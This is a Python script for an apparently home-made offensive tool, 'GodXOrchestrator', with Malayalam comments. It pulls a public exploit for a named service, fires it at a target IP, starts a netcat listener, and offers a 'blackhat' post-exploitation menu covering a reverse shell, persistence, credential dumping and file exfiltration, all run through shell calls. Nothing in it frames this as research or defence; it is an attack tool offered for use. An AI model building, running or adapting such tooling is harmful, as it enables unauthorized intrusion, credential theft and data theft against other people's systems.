import os, sys, threading, time
from exploit_finder import ExploitFinder
from poc_harvester import POCHarvester
from payload_configurer import PayloadConfigurer
from ghost_operator import GhostOperator
from colorama import Fore, Style, init

init(autoreset=True)

class GodXOrchestrator:
    def __init__(self):
        self.finder = ExploitFinder()
        self.harvester = POCHarvester()
        self.configurer = PayloadConfigurer()

    def start_listener(self, port):
        print(f"{Fore.BLUE}[*] Netcat Listener starting on port {port}...")
        os.system(f"nc -lvnp {port}")

    def execute_strike(self, target_ip, service):
        print(f"\n{Fore.RED}[🔥] ENGAGING TARGET: {target_ip}")
        kit = self.finder.get_weapon_kit(service)
        if kit['pocs']:
            target_dir = self.harvester.download_poc(service, kit['pocs'][0])
            if target_dir:
                exploit_file = os.path.join(target_dir, "exploit.py")
                ghost = GhostOperator(target_ip)
                
                while True:
                    print(f"\n{Fore.RED}{Style.BRIGHT}--- BLACKHAT POST-EXPLOIT MENU ---")
                    print("1. Remote Shell | 2. Persistence | 3. Creds Dump | 4. Stealth Exfil | 5. Exit")
                    choice = input(f"{Fore.YELLOW}[?] Select: ")
                    
                    if choice == "5": break
                    
                    cmd = ""
                    option = "rce" # 'exploit' എന്നതിന് പകരം ശരിയായ 'rce' ഓപ്ഷൻ
                    
                    if choice == "1":
                        cmd = ghost.get_reverse_shell_cmd()
                        threading.Thread(target=self.start_listener, args=(4444,)).start()
                        time.sleep(2)
                    elif choice == "2": cmd = ghost.set_persistence()
                    elif choice == "3": cmd = ghost.dump_credentials()
                    elif choice == "4": 
                        cmd = input("Absolute path to file: ")
                        option = "file" # ഫയൽ എക്സ്ഫിൽട്രേഷന് 'file' ഓപ്ഷൻ ഉപയോഗിക്കുന്നു

                    if cmd:
                        print(f"{Fore.GREEN}[⚡] Launching RCE Strike...")
                        os.system(f"python3 {exploit_file} {target_ip} 80 {option} '{cmd}'")

if __name__ == "__main__":
    orch = GodXOrchestrator()
    if len(sys.argv) > 1: orch.execute_strike(sys.argv[1], sys.argv[2])
